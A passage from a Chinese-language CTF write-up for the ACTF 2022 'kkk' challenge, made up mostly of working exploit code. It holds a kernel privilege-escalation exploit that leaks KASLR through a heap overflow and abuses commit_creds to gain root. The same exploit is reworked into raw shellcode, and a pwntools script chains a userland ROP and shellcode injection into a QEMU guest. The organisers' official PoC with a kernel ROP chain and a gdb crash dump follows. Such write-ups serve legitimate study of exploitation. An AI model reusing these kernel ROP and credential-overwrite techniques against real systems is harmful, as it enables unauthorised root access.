    Dump(fd, &r); // dump chunk 2 to leak kkk_fops

    uint64_t kernel_addr = *(uint64_t *)(sendbuf + 0x8); // 0xffffffff812258e0
    uint64_t commit_creds = kernel_addr - 0xffffffff812258e0 + 0xffffffff8109bcf0;
    printf("[+] kernel_addr: 0x%lx\n", kernel_addr);
    printf("[+] commit_creds: 0x%lx\n", commit_creds);

    r.id = 1;
    memset(recvbuf, 0, 0x10000);
    uint64_t *ptr = (uint64_t *)(recvbuf + 0x90);
    ptr[0] = 4;
    ptr[1] = 0;
    ptr[2] = 0;
    ptr[3] = 0;
    ptr[4] = 0;
    ptr[5] = commit_creds;

    ptr[6] = 0x1FFFFFFFFF;
    ptr[7] = 0x1FFFFFFFFF;
    ptr[8] = 0x1FFFFFFFFF;

    ptr[15] = slub_addr;
    // ptr[16] = 0xffffffff8284ef80;
    // ptr[17] = 0xffffffff8284f020;
    ptr[17] = commit_creds - 0xffffffff8109bcf0 + 0xffffffff8284f020;
    // ptr[18] = 0xffffffff82850e20;
    // ptr[19] = 0xffffffff82850610;
    Update(fd, &r);

    // getchar();
    r.id = 2;
    Run(fd, &r);    // trigger encryption, get root.

    
    printf("[+] Current UID: %d\n", getuid());
    if (getuid()==0){
        printf("[+] Root now!!!\n");
        getchar();
        char buf2[0x10] = "/flag";
        int tmpfd = open(buf2, O_RDONLY);
        if(tmpfd<0){
            printf("[-] Open error...");
            exit(0);
        }
        read(tmpfd, buf, 0x40);
        write(1, buf, 0x40);
    }

    return;
}

```

其实实在不行将 `ptr[17]` 指在堆上，并在对应伪造按照 `init_cred` 原封不动伪造也行。一路做下来反而感觉剩下三种提权的方法更容易，应该也更稳定。没有查到任何伪造 `init_cred` 的资料，以后还是少伪造这个吧...暂时也没精力去做细致一点的源码分析看看 `cred` 结构体这个值到底是什么了...有空再看看。

![](https://s2.loli.net/2022/07/16/eXnSdaGHsO317PJ.png)

#### 修改 exp

至此，我们打穿了内核。接下来不要忘了外面还套了一层 parser，所以我们得用 shellcode 来执行 exploit.c 提权，需要对 exp 进行一些修改。

首先，把能删的全删掉，比如打印信息、错误判断等语句。确认无误后进入下一步。

然后，我们需要把函数调用改成内嵌汇编，让它们全部不经过标准库函数（因为要全部转成 shellcode）。比如将 `ioctl` 改成 `__asm_my_ioctl` 。这里修饰词均为 static 与 inline。确认无误后进入下一步。

```c
static inline ssize_t __asm_my_ioctl(unsigned long fd, unsigned long cmd, unsigned long value)
{
    ssize_t ret;
    asm volatile(
        "syscall"
        : "=a"(ret)
        : "0"(__NR_ioctl), "D"(fd), "S"(cmd), "d"(value)
        : "rcx", "r11", "memory");
    return ret;
}
```

最后，避免使用数据段与 .bss 段的常量，把所有变量都放栈上。比如把 `open("/dev/kkk")` 写成 `buf[0x10]="/dev/kkk"; open(buf)`。好，改完之后我们的 exploit.c 变成了这个样子，测试一下发现还是能打通。

```c
#include <stdio.h>
#include <stdlib.h>
#include <sys/ioctl.h>
#include <string.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <unistd.h>
#include <errno.h>
#include <stdint.h>
#include <asm/unistd.h>

struct AddParam{
    unsigned long long type; // type and enc
    unsigned long long key_len;
    char * key;
    unsigned long long data_len;
    char * data;   
};

struct OtherParam{
    unsigned long long id;
    unsigned long long key_len;
    char * key;
    unsigned long long data_len;
    char * data;     
};

static inline ssize_t __asm_my_ioctl(unsigned long fd, unsigned long cmd, unsigned long value)
{
    ssize_t ret;
    asm volatile(
        "syscall"
        : "=a"(ret)
        : "0"(__NR_ioctl), "D"(fd), "S"(cmd), "d"(value)
        : "rcx", "r11", "memory");
    return ret;
}

static inline ssize_t __asm_my_write(unsigned long fd, unsigned long buf, unsigned long size)
{
    ssize_t ret;
    asm volatile(
        "syscall"
        : "=a"(ret)
        : "0"(__NR_write), "D"(fd), "S"(buf), "d"(size)
        : "rcx", "r11", "memory");
    return ret;
}

static inline ssize_t __asm_my_read(unsigned long fd, unsigned long buf, unsigned long size)
{
    ssize_t ret;
    asm volatile(
        "syscall"
        : "=a"(ret)
        : "0"(__NR_read), "D"(fd), "S"(buf), "d"(size)
        : "rcx", "r11", "memory");
    return ret;
}

static inline ssize_t __asm_my_open(unsigned long buf, unsigned long mode)
{
    ssize_t ret;
    asm volatile(
        "syscall"
        : "=a"(ret)
        : "0"(__NR_open), "D"(buf), "S"(mode)
        : "rcx", "r11", "memory");
    return ret;
}

static inline void Add(int fd, struct AddParam* p)
{
    __asm_my_ioctl(fd, 0x6B64, p);
}

static inline void Run(int fd, struct OtherParam* p)
{    
    __asm_my_ioctl(fd, 0x6B6B, p);
}

static inline void Update(int fd, struct OtherParam* p)
{
    __asm_my_ioctl(fd, 0x6B67, p);
}

static inline void Dump(int fd, struct OtherParam* p)
{
    __asm_my_ioctl(fd, 0x6B69, p);    
}

static __inline my_memset(char *dst, char c, int len){
    while(len--)
        *dst++ = c;
}

void main()
{
    char path[0x10] = "/dev/kkk";
    char buf[0x100];
    char sendbuf[0x100];
    char recvbuf[0x10000];
    
    // printf("[+] Current UID: %d\n", getuid());
    my_memset(buf, 0, 0x100);

    int fd = __asm_my_open(path, 0);
    // if(fd == -1){
    //     puts("[-] open wrong, exit");
    //     exit(0);
    // }

    struct AddParam a;
    struct OtherParam r;

    // malloc 1024 - 48 = 0x3D0

    a.type = 0;
    a.key_len = 0x7a;
    a.key = buf;
    a.data_len = 0x16;  // overflow 2 bits of the key size
    a.data = buf + 0x80;
    my_memset(buf, 0x42, 1);

    Add(fd, &a);

    a.type = 3;
    a.key_len = 0x80;
    a.key = buf;
    a.data_len = 0x10;
    a.data = buf + 0x80;
    my_memset(buf, 0x42, 8);

    Add(fd, &a);

    my_memset(buf, 0x43, 8);
    Add(fd, &a);


    r.id = 0;
    Run(fd, &r);  // trigger overflow

    r.id = 1;
    r.data = sendbuf;
    r.key = recvbuf;
    Dump(fd, &r);   // chunk 1 OOB read, read chunk 2

    uint64_t slub_addr = *(uint64_t *)(recvbuf + 0x98);  // 0xffff888005318b70
    uint64_t kkk_addr = *(uint64_t *)(recvbuf + 0xb8);   // 0xffffffffc0000130

    uint64_t kkk_fops = 0xffffffffc0001180ul + kkk_addr - 0xffffffffc0000130ul;

    // printf("[+] slub_addr: 0x%lx\n", slub_addr);
    // printf("[+] kkk_addr: 0x%lx\n", kkk_addr);
    // printf("[+] kkk_fops: 0x%lx\n", kkk_fops);


    *(uint64_t *)(recvbuf + 0x90) = 0x80;   // key_len
    *(uint64_t *)(recvbuf + 0x98) = slub_addr;   // key_buf
    *(uint64_t *)(recvbuf + 0xa0) = 0x50;   // data_len
    *(uint64_t *)(recvbuf + 0xa8) = kkk_fops;   // data_buf    
    Update(fd, &r);  // chunk 1 OOB write, write chunk 2 

    r.id = 2;   
    Dump(fd, &r); // dump chunk 2 to leak kkk_fops

    uint64_t kernel_addr = *(uint64_t *)(sendbuf + 0x8); // 0xffffffff812258e0
    uint64_t commit_creds = kernel_addr - 0xffffffff812258e0 + 0xffffffff8109bcf0;
    // printf("[+] kernel_addr: 0x%lx\n", kernel_addr);
    // printf("[+] commit_creds: 0x%lx\n", commit_creds);

    r.id = 1;
    my_memset(recvbuf, 0, 0x10000);

    uint64_t *ptr = (uint64_t *)(recvbuf + 0x90);
    ptr[0] = 4;
    ptr[1] = 0;
    ptr[2] = 0;
    ptr[3] = 0;
    ptr[4] = 0;
    ptr[5] = commit_creds;

    ptr[6] = 0x1FFFFFFFFF;
    ptr[7] = 0x1FFFFFFFFF;
    ptr[8] = 0x1FFFFFFFFF;

    ptr[15] = slub_addr;
    // ptr[16] = 0xffffffff8284ef80;
    // ptr[17] = 0xffffffff8284f020;
    ptr[17] = commit_creds - 0xffffffff8109bcf0 + 0xffffffff8284f020;
    // ptr[18] = 0xffffffff82850e20;
    // ptr[19] = 0xffffffff82850610;
    Update(fd, &r);

    // getchar();
    r.id = 2;
    Run(fd, &r);    // trigger encryption, get root.

    // printf("[+] Current UID: %d\n", getuid());
    // if (getuid()==0){
        // printf("[+] Root now!!!\n");
        // getchar();
    char buf2[0x10] = "/flag";
    int tmpfd = __asm_my_open(buf2, O_RDONLY);
        // if(tmpfd<0){
        //     printf("[-] Open error...");
        //     exit(0);
        // }
    __asm_my_read(tmpfd, buf, 0x40);
    __asm_my_write(1, buf, 0x40);
    // }

    // while(1);

    // system("/bin/sh");
    return;
}
```

## step 3 

最后一步，我们将两个 exp 合起来。首先拿到 exloit.c 的 shellcode，如果确实都改成 inline 汇编的话，直接这样编译就行。

```
gcc exploit.c -o exploit -pie -O2 -fno-stack-protector
```

提取出代码段，于是便得到了纯机器码的利用脚本。在打穿 parser 的脚本中读入这段 shellcode 即可完成利用。

```
objcopy -O binary --only-section=.text exploit exp.o
```

最后需要注意一点，shellcode 不能直接 `read` 进来，需要利用 parser 里的 `read_through_base64` 函数读 base64 进去。

> 直接发了不可见字符给 qemu 会被吞字节的，因为相当于发信号过去了。

最终 exp 如下，以不小的概率打通。

```python

import base64
import sys
import base64

sys.path.append('/home/x1do0/.local/lib/python3.8/site-packages')
sys.path.append('/home/x1do0/.local/lib/python3.8/site-packages/unicornafl-1.0.3-py3.8.egg')

print(sys.path)


from pwn import *

context(arch = 'amd64', os = 'linux', endian = 'little')
context.log_level = 'debug'
context.terminal = ['tmux', 'splitw', '-h', '-p', '75']

def SEND(io, con):
    io.send(base64.b64encode(con))


# io = process("./parser")

io = process(["qemu-system-x86_64", "-m", "1024M", "-kernel", "bzImage", "-initrd", "rootfs.img", "-monitor", "/dev/null", "-append", "root=/dev/ram console=ttyS0 oops=panic panic=1 kpti=1 quiet", "-cpu", "kvm64,+smep,+smap", "-smp", "cores=2,threads=2", "-nographic", "-enable-kvm"])

# input()
# gdb.attach(io, "b *0x401B22")

for i in range(15):
    io.sendafter("ENTER YOUR PACKET > ", '\n')

io.recvuntil("ENTER YOUR PACKET > ")

### pakcet_hdr 0 - 0x30

packet_hdr = p32(0xAAA) + p32(1)
packet_hdr += p64(0)
packet_hdr += p32(0x877) # a1[4]
packet_hdr += p32(0x796f15c9) # crc32
packet_hdr = packet_hdr.ljust(0x30, b'\x00')


SEND(io, packet_hdr)

### segment_hdr 0x30 - 0x38

cnt = 1
segment_hdr = p32(cnt) + p32(0) # a1[:30]

SEND(io, segment_hdr)

### segment 0x38 - 


### header 8 bytes
size = 0xf0000000
segment = p32(0) + p32(size)
SEND(io, segment) 

### content size bytes

# 0x00000000004006a6 : pop rdi ; ret
# 0x000000000045c139 : pop rdx ; pop rsi ; ret
# 0x00000000004005af : pop rax ; ret
# 0x00000000004859c5 : syscall ; ret


# mprotect(buf, 0x1000, 4|2|1)

buf_addr = 0x6D4000

rop = flat(0x00000000004006a6, buf_addr,
        0x000000000045c139, 7, 0x1000,
        0x00000000004005af, 10,
        0x00000000004859c5)

# read(0, buf, 0x100)

# rop += flat(0x00000000004006a6, 0,
#         0x000000000045c139, 0x100, buf_addr,
#         0x00000000004005af, 0,
#         0x00000000004859c5)


shellcode = asm(shellcraft.open("/flag"))
shellcode += asm(shellcraft.read('rax', buf_addr+0x200, 0x20))
shellcode += asm(shellcraft.write(1, buf_addr+0x200, 0x20))

with open("exp.o", 'rb') as f:
    shellcode = f.read()

rop += flat(0x00000000004006a6, buf_addr,
        0x402a3c, len(shellcode)+1, 
        0x401ABB)


# ret2shellcode

rop += p64(buf_addr)

content = b'a'*0x848 + rop
SEND(io, content)

io.sendline()

io.sendline(base64.b64encode(shellcode))

# 0x7ffdbdb52b80
# return at 0x7ffdbdb533c8


io.interactive()
```

## Conclusion

至此，这题就算是做完了。最终的脚本成功概率不是特别高，但如果用户态 ROP 时加几个 ret slide 的话概率能显著提高（可能是错觉...）。一开始脸比较黑总是打不通，还以为 host 和 guest 偏移不一样...但这是静态编译啊，当时就觉得很迷。不过最后能确认的一点就是：host 与 guest 偏移没区别。虽然 Nu1L 那边的师傅也觉得痛苦，但我想我的痛苦完全源于自己太弱。。（脸黑也是弱的一个表现 :/

![](https://s2.loli.net/2022/07/17/T6C3GoAZ1itfaHe.png)


最后再贴一下出题人大哥忘记传上[官方题解](https://github.com/team-s2/ACTF-2022/tree/main/pwn/kkk/exploits)的 exploit.c

```c
// this POC demonstrates the oob ability

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>

#include <sys/types.h>
#include <sys/ioctl.h>
#include <sys/stat.h>
#include <fcntl.h>

#include <errno.h>
#include <unistd.h>
#include <time.h>

/* ioctl commands */
#define KKK_IOCTL_ADD _IO('k', 100)
#define KKK_IOCTL_UPDATE _IO('k', 103)
#define KKK_IOCTL_DUMP _IO('k', 105)
#define KKK_IOCTL_LAUNCH _IO('k', 107)
#define KKK_IOCTL_DETACH _IO('k', 109)

#define MAX_OBJECT_NUM (16)

enum kkk_type
{
    KKK_CRYPTO_DES,
    KKK_CRYPTO_3DES,
    KKK_CRYPTO_AES128,
    KKK_CRYPTO_AES256,
    KKK_CRYPTO_NUM
};

/* core data strcutres */
struct kkk_pack
{
    unsigned int size;
    void *ptr; // user space pointer
};

struct kkk_obj
{
    struct kkk_pack keypack;
    struct kkk_pack datapack;
    int id;
    int enc;
    int (*handler)(struct kkk_obj *);
};

struct kkk_ioctl_add_arg
{
    enum kkk_type type;
    int enc;
    struct kkk_pack key;
    struct kkk_pack data;
};

// we are sorry to introduce this structure
// only now we can use one indirect call to pivot the stack to heap
struct kkk_ioctl_other_arg
{
    int id;
    struct kkk_pack key;
    struct kkk_pack data;
};

void privileged_function()
{
    int uid = getuid();
    printf("uid: %d\n", uid);
    int fd = open("/flag", O_RDONLY);
    char buf[128] = {0};
    read(fd, buf, 128);
    puts(buf);
}

uint64_t user_cs, user_ss, user_rflags, user_sp;
uint64_t user_rip = (uint64_t)privileged_function;

void save_state()
{
    __asm__(".intel_syntax noprefix;"
            "mov user_cs, cs;"
            "mov user_ss, ss;"
            "mov user_sp, rsp;"
            "pushf;"
            "pop user_rflags;"
            ".att_syntax");
}

int main(int argc, char *argv[])
{
    struct kkk_ioctl_add_arg add_arg = {0};
    struct kkk_ioctl_other_arg other_arg = {0};

    // ============ LEAK ============
    // 1 - open
    int fd = open("/dev/kkk", O_RDWR);
    int i, r;
    if (fd < 0)
    {
        perror("open");
        exit(1);
    }

    // 2 - add two adjacent objects
    unsigned char key[450] = {0};
    unsigned char data[14] = {0};

    // bruteforce result here
    // # prefix b'\xee)\xa4\xbd\x9a.' support value 1022
    memcpy(data + 8, "\xee)\xa4\xbd\x9a.", 14);

    add_arg.type = KKK_CRYPTO_DES;
    add_arg.enc = 1;
    add_arg.key.ptr = key;
    add_arg.key.size = 450;
    add_arg.data.ptr = data;
    add_arg.data.size = 14; // 2 bytes misaligan :)

    r = ioctl(fd, KKK_IOCTL_ADD, &add_arg);
    if (r < 0)
    {
        perror("KKK_IOCTL_ADD");
        goto leave;
    }
    r = ioctl(fd, KKK_IOCTL_ADD, &add_arg);
    if (r < 0)
    {
        perror("KKK_IOCTL_ADD");
        goto leave;
    }

    r = ioctl(fd, KKK_IOCTL_ADD, &add_arg);
    if (r < 0)
    {
        perror("KKK_IOCTL_ADD");
        goto leave;
    }

    // make the kernel stack bigger enough
    r = ioctl(fd, KKK_IOCTL_ADD, &add_arg);
    if (r < 0)
    {
        perror("KKK_IOCTL_ADD");
        goto leave;
    }

    // then we try to overflow with launch
    int id = 0;
    other_arg.id = id;
    r = ioctl(fd, KKK_IOCTL_LAUNCH, &other_arg);
    if (r < 0)
    {
        perror("KKK_IOCTL_LAUNCH");
        goto leave;
    }
    // the id'1 keysize will now be extremely large
    // dump it
    id = 1;
    unsigned char keybuf[65535] = {0};
    unsigned char databuf[30] = {0};
    other_arg.id = id;
    other_arg.key.ptr = keybuf;
    other_arg.data.ptr = data;

    r = ioctl(fd, KKK_IOCTL_DUMP, &other_arg);
    if (r < 0)
    {
        perror("KKK_IOCTL_DUMP");
        goto leave;
    }

    // since keylength is 450
    //       data is 14
    struct kkk_obj *obj = keybuf + 450 + 14;
    printf("leaked:\n");
    printf("key heap address: 0x%lx\n", obj->keypack.ptr);
    printf("data heap address: 0x%lx\n", obj->datapack.ptr);
    printf("handler adddress: 0x%lx\n", obj->handler);

    unsigned long module_kaslroffset = obj->handler - 0xffffffffc0000510ul;
    printf("module kaslr offset: 0x%lx\n", module_kaslroffset);

    unsigned long module_load_address = 0xffffffffc0000000ul + module_kaslroffset;
    printf("module loaded at: 0x%lx\n", module_load_address);

    unsigned long kkk_fops_address = 0xffffffffc0001180ul + module_kaslroffset;
    unsigned long kkk_fops_size = 16; // 16 is enough

    // we hence exploit third chunks key and data ptr to read kkk_fops
    char updatedkey[0x3fe] = {0};
    // key size
    memcpy(updatedkey + 450 + 14 + 0, &kkk_fops_size, 8);
    // overflow key pointer
    memcpy(updatedkey + 450 + 14 + 8, &kkk_fops_address, 8);

    other_arg.id = 1;
    other_arg.key.ptr = updatedkey;
    other_arg.data.ptr = data;

    r = ioctl(fd, KKK_IOCTL_UPDATE, &other_arg);
    if (r < 0)
    {
        perror("KKK_IOCTL_UPDATE");
        goto leave;
    }

    other_arg.id = 2;
    other_arg.key.ptr = key;
    other_arg.data.ptr = data;

    r = ioctl(fd, KKK_IOCTL_DUMP, &other_arg);
    if (r < 0)
    {
        perror("KKK_IOCTL_DUMP");
        goto leave;
    }

    unsigned long no_llseek_address;
    memcpy(&no_llseek_address, key + 8, 8);
    printf("no_llseek address: 0x%lx\n", no_llseek_address);

    if (no_llseek_address == 0) // buggy hence drop
        goto leave;

    unsigned long kaslroffset = no_llseek_address - 0xffffffff812258e0ul;
    printf("core KASLR offset: 0x%lx\n", kaslroffset);

    // recover third chunk key size and data ??? need to?
    // starts ROP 
    save_state();
    
    // 0xffffffff8106df19: mov rsp, qword ptr [rsp + 0x20]; pop rbx; pop rbp; ret;
    memset(updatedkey, 0, sizeof(updatedkey));
    other_arg.id = 1;
    other_arg.key.ptr = updatedkey;
    other_arg.data.ptr = databuf;

    // third need to be placed ROP stuff in key
    // POC: try printk as an example
    // 0xffffffff81001614: pop rdi; ret;
    unsigned long PIVOT_GADGET = 0xffffffff8106df19ul + kaslroffset;
    unsigned long POP_RDI_GADGET = 0xffffffff81001614ul + kaslroffset;
    unsigned long RBX = 0;
    unsigned long RBP = 0;

    unsigned long RDI_PRINTK_ARG = obj->datapack.ptr;
    // ffffffff81c5e83f T _printk
    // why my printk is a lot of mess
    unsigned long PRINTK = 0xffffffff81c5e83ful + kaslroffset;
    // ffffffff8109bf90 T prepare_kernel_cred
    unsigned long PREPARE_KERNEL_CRED = 0xffffffff8109bf90ul + kaslroffset;
    // ffffffff8109bcf0 T commit_creds
    unsigned long COMMIT_CREDS = 0xffffffff8109bcf0ul + kaslroffset;
    // 0xffffffff8126a99e <mark_buffer_dirty+254>:	test   edi,esi
    // this possibly can change the flag
    unsigned long TEST_ESI_EDI = 0xffffffff8126a99eul + kaslroffset;
    // 0xffffffff8162fc5b: mov rdi, rax; jne 0x630c33; mov eax, ebx; pop rbx; pop rbp; ret
    // can we use this one (without jump) need to debug
    unsigned long MOV_RDI_RAX = 0xffffffff8162fc5bul + kaslroffset;

    // the pivot gadget will pop rbx and rbp,
    memcpy(updatedkey + 450 + 14 + 40, &PIVOT_GADGET, 8);
    memcpy(updatedkey + 450 + 14 + 48, &RBX, 8);
    memcpy(updatedkey + 450 + 14 + 48 + 8, &RBP, 8);
    // prepare 0 to RDI
    memcpy(updatedkey + 450 + 14 + 48 + 16, &POP_RDI_GADGET, 8);
    memset(updatedkey + 450 + 14 + 48 + 24, 0, 8);
    // return to prepare_kernel_creds
    memcpy(updatedkey + 450 + 14 + 48 + 32, &PREPARE_KERNEL_CRED, 8);
    // now the rax is the argument, move it to tdi
    memcpy(updatedkey + 450 + 14 + 48 + 40, &TEST_ESI_EDI, 8);
    memcpy(updatedkey + 450 + 14 + 48 + 48, &MOV_RDI_RAX, 8);
    // two additional POP here
    memcpy(updatedkey + 450 + 14 + 48 + 56, &RBX, 8);
    memcpy(updatedkey + 450 + 14 + 48 + 64, &RBP, 8);
    // return to commit_creds
    memcpy(updatedkey + 450 + 14 + 48 + 72, &COMMIT_CREDS, 8);

    // !!! TODO: we have to take care of the stack recover and ret2usr
    // learn about the kernel stack mechanism
    // ffffffff81e00e10 T swapgs_restore_regs_and_return_to_usermode
    // 0xffffffff81e00e10 <common_interrupt_return>:	pop    r15

    unsigned long swapgs_restore_movq = 0xffffffff81e00e26ul + kaslroffset;
    // to swapgs_restore_regs_and_return_to_usermode
    memcpy(updatedkey + 450 + 14 + 48 + 80, &swapgs_restore_movq, 8);
    // fake returning stack
    unsigned long retRAX = 0;
    unsigned long retRDI = 0;
    // reverse
    memcpy(updatedkey + 450 + 14 + 48 + 88, &retRAX, 8);
    memcpy(updatedkey + 450 + 14 + 48 + 96, &retRDI, 8);
    memcpy(updatedkey + 450 + 14 + 48 + 104, &user_rip, 8);
    memcpy(updatedkey + 450 + 14 + 48 + 112, &user_cs, 8);
    memcpy(updatedkey + 450 + 14 + 48 + 120, &user_rflags, 8);
    memcpy(updatedkey + 450 + 14 + 48 + 128, &user_sp, 8);
    memcpy(updatedkey + 450 + 14 + 48 + 136, &user_ss, 8);
    // shall this enough

    r = ioctl(fd, KKK_IOCTL_UPDATE, &other_arg);
    if (r < 0)
    {
        perror("KKK_IOCTL_UPDATE");
        goto leave;
    }

    // we belive the third chunk is corrupted now
    other_arg.id = 2;
    // uses this to pivot gadget to heap
    other_arg.key.size = 0xaaaaaaaa;
    other_arg.key.ptr = 0xbbbbbbbb;
    // this will fill in stack to help with stack pivot
    unsigned long pivotaddr = obj->keypack.ptr;
    memcpy(&other_arg.data.size, &pivotaddr, 8);
    // other_arg.data.size = obj->keypack.ptr;
    other_arg.data.ptr = 0xdddddddd;
    r = ioctl(fd, KKK_IOCTL_LAUNCH, &other_arg);
    if (r < 0)
    {
        perror("KKK_IOCTL_LAUNCH");
        goto leave;
    }

leave:
    close(fd);
    return 0;
}

// OKAY we crash the kernel, the spot is like
// ────────────────────────────────────────────────────────────────────────────────────── registers ────
// $rax   : 0x000000deadbeef  →  0x000000deadbeef
// $rbx   : 0xffff88800530a240  →  0x00000000000001  →  0x00000000000001
// $rcx   : 0x00000000000000  →  0x00000000000000
// $rdx   : 0x00000000000001  →  0x00000000000001
// $rsp   : 0xffffc900002a7e98  →  0xe06d573eab3d7900  →  0xe06d573eab3d7900
// $rbp   : 0x00000000006b6b  →  0x00000000006b6b
// $rsi   : 0x00000000006b6b  →  0x00000000006b6b
// $rdi   : 0xffff888005171400  →  0x00000000000000  →  0x00000000000000
// $rip   : 0xffffffffc00008ae  →  0xe86348c200272de8  →  0xe86348c200272de8
// $r8    : 0x00000000000001  →  0x00000000000001
// $r9    : 0x00000000000000  →  0x00000000000000
// $r10   : 0xffffc900002a7ee0  →  0xffff888005327000  →  0x00000000000000  →  0x00000000000000
// $r11   : 0x00000000000000  →  0x00000000000000
// $r12   : 0x00000000000002  →  0x00000000000002
// $r13   : 0x00000000000002  →  0x00000000000002
// $r14   : 0x00000000000003  →  0x00000000000003
// $r15   : 0x00000000000000  →  0x00000000000000
// $eflags: [zero carry PARITY adjust SIGN trap INTERRUPT direction overflow resume virtualx86 identification]
// $cs: 0x10 $ss: 0x18 $ds: 0x00 $es: 0x00 $fs: 0x00 $gs: 0x00
// ────────────────────────────────────────────────────────────────────────────────────────── stack ────
// 0xffffc900002a7e98│+0x0000: 0xe06d573eab3d7900  →  0xe06d573eab3d7900	 ← $rsp
// 0xffffc900002a7ea0│+0x0008: 0xffffffff829b38e8  →  0x00000000000000  →  0x00000000000000
// 0xffffc900002a7ea8│+0x0010: 0xffffc900002a7ee0  →  0xffff888005327000  →  0x00000000000000  →  0x00000000000000
// 0xffffc900002a7eb0│+0x0018: 0x00000000006b6b  →  0x00000000006b6b
// 0xffffc900002a7eb8│+0x0020: 0xffff888005327000  →  0x00000000000000  →  0x00000000000000
// 0xffffc900002a7ec0│+0x0028: 0x00000000000002  →  0x00000000000002
// 0xffffc900002a7ec8│+0x0030: 0xe06d573eab3d7900  →  0xe06d573eab3d7900
// 0xffffc900002a7ed0│+0x0038: 0xffff888005327000  →  0x00000000000000  →  0x00000000000000
// ──────────────────────────────────────────────────────────────────────────────────── code:x86:64 ────
//    0xffffffffc00008a1                  test   rdi, rdi
//    0xffffffffc00008a4                  je     0xffffffffc00007bd
//    0xffffffffc00008aa                  mov    rax, QWORD PTR [rdi+0x28]
// ●→ 0xffffffffc00008ae                  call   0xffffffff82002fe0 <__x86_indirect_thunk_array>
//    ↳  0xffffffff82002fe0 <__x86_indirect_thunk_array+0> call   0xffffffff82002fec <__x86_indirect_thunk_array+12>
//       0xffffffff82002fe5 <__x86_indirect_thunk_array+5> pause
//       0xffffffff82002fe7 <__x86_indirect_thunk_array+7> lfence
//       0xffffffff82002fea <__x86_indirect_thunk_array+10> jmp    0xffffffff82002fe5 <__x86_indirect_thunk_array+5>
//       0xffffffff82002fec <__x86_indirect_thunk_array+12> mov    QWORD PTR [rsp], rax
//       0xffffffff82002ff0 <__x86_indirect_thunk_array+16> ret
// ──────────────────────────────────────────────────────────────────────────── arguments (guessed) ────
// __x86_indirect_thunk_array (
//    $rdi = 0xffff888005171400 → 0x00000000000000 → 0x00000000000000,
//    $rsi = 0x00000000006b6b → 0x00000000006b6b,
//    $rdx = 0x00000000000001 → 0x00000000000001
// )
// ──────────────────────────────────────────────────────────────────────────────────────── threads ────
// [#0] Id 1, stopped 0xffffffff81c72f9b in default_idle (), reason: BREAKPOINT
// [#1] Id 2, stopped 0xffffffffc00008ae in ?? (), reason: BREAKPOINT
// [#2] Id 3, stopped 0xffffffff81c72f9b in default_idle (), reason: BREAKPOINT
// [#3] Id 4, stopped 0xffffffff810a5a36 in resched_curr (), reason: BREAKPOINT
// ────────────────────────────────────────────────────────────────────────────────────────── trace ────
// [#0] 0xffffffffc00008ae → call 0xffffffff82002fe0 <__x86_indirect_thunk_array>
// ─────────────────────────────────────────────────────────────────────────────────────────────────────

// Thread 2 hit Breakpoint 2, 0xffffffffc00008ae in ?? ()

// The rdi is pointing at instance (0xffff888005171400)

// about stack
// gef➤  tele $rsp -l128
// 0xffffc900002a7e98│+0x0000: 0xe06d573eab3d7900  →  0xe06d573eab3d7900	 ← $rsp
// 0xffffc900002a7ea0│+0x0008: 0xffffffff829b38e8  →  0x00000000000000  →  0x00000000000000
// 0xffffc900002a7ea8│+0x0010: 0xffffc900002a7ee0  →  0xffff888005327000  →  0x00000000000000  →  0x00000000000000
// 0xffffc900002a7eb0│+0x0018: 0x00000000006b6b  →  0x00000000006b6b
// 0xffffc900002a7eb8│+0x0020: 0xffff888005327000  →  0x00000000000000  →  0x00000000000000
// 0xffffc900002a7ec0│+0x0028: 0x00000000000002  →  0x00000000000002
// 0xffffc900002a7ec8│+0x0030: 0xe06d573eab3d7900  →  0xe06d573eab3d7900
// 0xffffc900002a7ed0│+0x0038: 0xffff888005327000  →  0x00000000000000  →  0x00000000000000
// 0xffffc900002a7ed8│+0x0040: 0xe06d573eab3d7900  →  0xe06d573eab3d7900
// 0xffffc900002a7ee0│+0x0048: 0xffff888005327000  →  0x00000000000000  →  0x00000000000000	 ← $r10
// 0xffffc900002a7ee8│+0x0050: 0xffff888005327000  →  0x00000000000000  →  0x00000000000000
// 0xffffc900002a7ef0│+0x0058: 0x00000000006b6b  →  0x00000000006b6b
// 0xffffc900002a7ef8│+0x0060: 0x00000000000002  →  0x00000000000002
// 0xffffc900002a7f00│+0x0068: 0xffffffff8123e1e9  →  0x48b275fffffdfd3d  →  0x48b275fffffdfd3d
// 0xffffc900002a7f08│+0x0070: 0x00000000000000  →  0x00000000000000
// 0xffffc900002a7f10│+0x0078: 0xffffc900002a7f58  →  0x00000000000000  →  0x00000000000000
// 0xffffc900002a7f18│+0x0080: 0xffffc900002a7f48  →  0x00000000000000  →  0x00000000000000
// 0xffffc900002a7f20│+0x0088: 0x00000000000000  →  0x00000000000000
// 0xffffc900002a7f28│+0x0090: 0x00000000000000  →  0x00000000000000
// 0xffffc900002a7f30│+0x0098: 0x00000000000000  →  0x00000000000000
// 0xffffc900002a7f38│+0x00a0: 0xffffffff81c670ba  →  0xe8df894850438948  →  0xe8df894850438948
// 0xffffc900002a7f40│+0x00a8: 0x00000000000000  →  0x00000000000000
// 0xffffc900002a7f48│+0x00b0: 0x00000000000000  →  0x00000000000000
// 0xffffc900002a7f50│+0x00b8: 0xffffffff81e0007c  →  0x4c8b480000441f0f  →  0x4c8b480000441f0f
// 0xffffc900002a7f58│+0x00c0: 0x00000000000000  →  0x00000000000000
// 0xffffc900002a7f60│+0x00c8: 0x000000006ba018  →  0x00000000440dc0  →  0x894807e183f18948  →  0x894807e183f18948
// 0xffffc900002a7f68│+0x00d0: 0x00000000000000  →  0x00000000000000
// 0xffffc900002a7f70│+0x00d8: 0x00000000401e60  →  0x2b52f8058d4855  →  0x2b52f8058d4855
// 0xffffc900002a7f78│+0x00e0: 0x007ffc04e14e30  →  0x00000000401dc0  →  0x2b53773d8d4c5741  →  0x2b53773d8d4c5741
// 0xffffc900002a7f80│+0x00e8: 0x00000000400400  →  0xc0c74808ec8348  →  0xc0c74808ec8348
// 0xffffc900002a7f88│+0x00f0: 0x00000000000246  →  0x00000000000246
// 0xffffc900002a7f90│+0x00f8: 0x00000000000000  →  0x00000000000000
// 0xffffc900002a7f98│+0x0100: 0x00000000000012  →  0x00000000000012
// 0xffffc900002a7fa0│+0x0108: 0x00000000000000  →  0x00000000000000
// 0xffffc900002a7fa8│+0x0110: 0xffffffffffffffda  →  0xffffffffffffffda
